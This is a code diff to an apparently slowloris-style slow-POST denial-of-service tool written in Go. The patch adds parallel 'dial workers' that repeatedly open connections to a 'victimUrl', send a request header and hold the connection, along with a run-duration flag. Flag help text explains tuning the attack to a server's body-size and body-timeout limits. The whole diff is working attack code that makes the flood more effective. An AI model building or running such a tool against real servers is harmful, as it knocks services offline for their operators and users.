@@ -47,11 +47,13 @@ import (
 )
 
 var (
-	contentLength  = flag.Int("contentLength", 1000*1000, "The maximum length of fake body in bytes. Adjust to client_max_body_size")
-	goMaxProcs     = flag.Int("goMaxProcs", runtime.NumCPU(), "The maximum number of CPUs to use. Don't touch :)")
-	rampUpInterval = flag.Duration("rampUpInterval", 100*time.Millisecond, "Interval between new connections' acquisitions")
-	sleepInterval  = flag.Duration("sleepInterval", 50*time.Second, "Sleep interval between subsequent packets sending. Adjust to client_body_timeout")
-	victimUrl      = flag.String("victimUrl", "http://127.0.0.1/", "Victim's url (must support http POST)")
+	contentLength    = flag.Int("contentLength", 1000*1000, "The maximum length of fake body in bytes. Adjust to client_max_body_size")
+	dialWorkersCount = flag.Int("dialWorkersCount", 2, "The number of workers simultaneously busy with opening new TCP connections")
+	goMaxProcs       = flag.Int("goMaxProcs", runtime.NumCPU(), "The maximum number of CPUs to use. Don't touch :)")
+	rampUpInterval   = flag.Duration("rampUpInterval", 100*time.Millisecond, "Interval between new connections' acquisitions for a single dial workers (see dialWorkersCount)")
+	sleepInterval    = flag.Duration("sleepInterval", 50*time.Second, "Sleep interval between subsequent packets sending. Adjust to client_body_timeout")
+	testDuration     = flag.Duration("testDuration", time.Hour, "Test duration")
+	victimUrl        = flag.String("victimUrl", "http://127.0.0.1/", "Victim's url (must support http POST)")
 )
 
 var (
@@ -63,9 +65,11 @@ func main() {
 	flag.Parse()
 
 	fmt.Printf("contentLength=%d\n", *contentLength)
+	fmt.Printf("dialWorkersCount=%d\n", *dialWorkersCount)
 	fmt.Printf("goMaxProcs=%d\n", *goMaxProcs)
 	fmt.Printf("rampUpInterval=%s\n", *rampUpInterval)
 	fmt.Printf("sleepInterval=%s\n", *sleepInterval)
+	fmt.Printf("testDuration=%s\n", *testDuration)
 	fmt.Printf("victimUrl=%s\n", *victimUrl)
 
 	runtime.GOMAXPROCS(*goMaxProcs)
@@ -83,13 +87,20 @@ func main() {
 
 	activeConnectionsCh := make(chan int, 10)
 	go activeConnectionsCounter(activeConnectionsCh)
+	for i := 0; i < *dialWorkersCount; i++ {
+		go dialWorker(activeConnectionsCh, victimHostPort, victimUri, requestHeader)
+	}
+	time.Sleep(*testDuration)
+}
+
+func dialWorker(activeConnectionsCh chan<- int, victimHostPort string, victimUri *url.URL, requestHeader []byte) {
 	for {
 		time.Sleep(*rampUpInterval)
 		conn := dialVictim(victimHostPort)
 		if conn == nil {
 			continue
 		}
-		if _, err = conn.Write(requestHeader); err != nil {
+		if _, err := conn.Write(requestHeader); err != nil {
 			log.Printf("Error writing request header: [%s]\n", err)
 			continue
 		}
